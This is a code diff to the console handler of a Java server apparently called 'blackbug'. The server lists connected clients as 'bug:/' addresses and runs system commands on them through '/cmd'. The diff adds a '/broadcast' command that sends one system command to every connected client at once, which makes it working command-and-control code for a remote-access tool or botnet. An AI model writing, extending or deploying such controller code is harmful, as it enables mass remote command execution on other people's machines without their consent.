@@ -3,6 +3,9 @@ package pers.adlered.blackbug.server.connection;
 import pers.adlered.blackbug.server.Temp;
 import pers.adlered.blackbug.server.connection.storge.StreamStorge;
 
+import java.io.BufferedWriter;
+import java.io.IOException;
+import java.io.OutputStreamWriter;
 import java.util.Iterator;
 
 public class ConsoleHandler {
@@ -15,11 +18,13 @@ public class ConsoleHandler {
             result += "/list\n";
             result += "-- Show available UID(S)\n";
             result += "/cmd [command]\n";
-            result += "-- Run a system command(All system support)\n";
+            result += "-- Execute a system command (All system support)\n";
+            result += "/broadcast [command]\n";
+            result += "-- Execute a system command to all connections (All system support)\n";
             result += "======== PLEH ========";
         }
         if (command.startsWith("/setuid ")) {
-            String UID = command.replaceAll("/setuid ", "");
+            String UID = command.replaceFirst("/setuid ", "");
             Temp.currentUID = Integer.parseInt(UID);
             result += "[Command] UID " + Temp.currentUID + " set.";
         }
@@ -32,6 +37,20 @@ public class ConsoleHandler {
                 result += "bug:/" + StreamStorge.sockets.get(key).getRemoteSocketAddress() + "\n";
             }
             result += "======== DIU ========\n";
+        }
+        if (command.startsWith("/broadcast ")) {
+            String broadcastCommand = "/cmd " + command.replaceFirst("/broadcast ", "");
+            Iterator<Integer> iterator = StreamStorge.sockets.keySet().iterator();
+            while (iterator.hasNext()) {
+                int key = iterator.next();
+                try {
+                    BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(StreamStorge.sockets.get(key).getOutputStream(), "UTF-8"));
+                    bufferedWriter.write(broadcastCommand);
+                    bufferedWriter.flush();
+                } catch (IOException IOE) {
+                }
+            }
+            result += "[Command] Broadcast message: " + broadcastCommand;
         }
         return result;
     }
